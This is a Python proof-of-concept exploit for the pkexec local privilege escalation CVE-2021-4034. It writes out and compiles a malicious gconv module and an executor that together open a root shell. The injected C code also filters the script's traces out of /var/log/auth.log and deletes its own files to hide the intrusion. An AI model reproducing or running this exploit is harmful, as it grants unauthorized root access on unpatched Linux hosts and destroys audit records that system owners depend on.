#!/usr/bin/env python3
import os


class bcol:
    RED = '\033[95m'
    GREEN = '\033[92m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"""{bcol.RED}
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
""")
print("CVE-2021-4034 PoC by Kim Schulz")
# suid shell code. Will cleanup from the build etc to remove tracks
suidCode = """
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void gconv(){}
void gconv_init() {
  setgid(0);setegid(0);
  setuid(0);seteuid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
         "/bin/bash");
  exit(0);
}
"""
# Python cannot set null argv so we need a bit of C for that
executor = """
#include <stdlib.h>
#include <unistd.h>
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
"""
print(f"{bcol.GREEN} [+] Setting up environment...")
os.system('mkdir -p "GCONV_PATH=."')
os.system('touch "GCONV_PATH=./pkwner"')
os.system('chmod a+x "GCONV_PATH=./pkwner"')
os.system("mkdir -p pkwner;")
os.system('echo "module UTF-8// PKWNER// pkwner 2" > pkwner/gconv-modules')
print(" [+] Creating offensive gconv module...")
file = open('pkwner/pkwner.c', 'w')
file.write(suidCode)
file.close()
os.system('gcc -shared -fPIC -o pkwner/pkwner.so pkwner/pkwner.c')
print(" [+] Creating executor...")
file = open("pkwner/exec.c", "w")
file.write(executor)
file.close()
os.system('gcc -o pkwner/executor pkwner/exec.c')
print(f" [+] Pop that shell...{bcol.RED}BAM!{bcol.RESET}")
os.system('./pkwner/executor')
print(f"{bcol.RED}{bcol.UNDERLINE}{bcol.BOLD}nice job!{bcol.RESET}")

